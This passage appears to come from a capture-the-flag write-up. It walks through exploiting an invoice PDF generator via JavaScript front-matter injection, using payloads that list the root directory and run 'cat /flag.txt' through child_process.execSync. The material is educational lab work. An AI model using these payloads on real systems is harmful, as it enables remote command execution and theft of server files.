6. Checking the github issue and found another payload we can use.

7. Little bit confused for the first payload we got, but let's use the other one with more thumbs up :D.

```js
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```


8. Copy the payload -> create new invoice -> paste the script -> save. Open the pdf file.

9. Great we listed all the files and directories, notice there's a `flag.txt` file. Now to cat the flag we can utilize the payload we got at first. Grab this one and modify the payload

> FROM

```js
---js
{
    css: `body::before { content: "${}"; display: block }`,
}
---
```

> TO

```js
---js
{
    css: `body::before { content: "${require('child_process').execSync('cat /flag.txt')}"; display: block }`,
}
---
```

10. Now create new invoice again -> paste the payload -> save it -> open the pdf.

> RESULT
